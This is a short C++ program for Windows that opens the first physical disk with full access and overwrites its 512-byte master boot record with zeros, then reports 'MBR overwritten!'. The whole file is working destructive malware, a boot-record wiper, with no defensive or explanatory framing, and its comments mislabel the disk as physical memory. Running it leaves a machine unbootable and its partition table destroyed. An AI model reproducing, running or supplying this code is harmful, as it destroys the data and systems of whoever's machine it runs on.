#include <iostream>
#include <Windows.h>

#define MBR_SIZE 512 // Size of the MBR

int main() {
    char mbrData[MBR_SIZE] = { 0 }; // Array to store the MBR data, initialized with zeros

    // Open the drive to the physical memory
    HANDLE masterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    
    if (masterBootRecord == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open the drive. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    DWORD bytesWritten; // Variable to store the number of bytes written

    // Write the data to the physical memory
    if (WriteFile(masterBootRecord, mbrData, MBR_SIZE, &bytesWritten, NULL)) {
        std::cout << "MBR overwritten!" << std::endl;
    } else {
        std::cerr << "Failed to overwrite the MBR. Error code: " << GetLastError() << std::endl;
    }

    // Close the handle to the physical memory
    CloseHandle(masterBootRecord);

    std::cout << "Press Enter to exit...";
    std::cin.get();
    return 0;
}
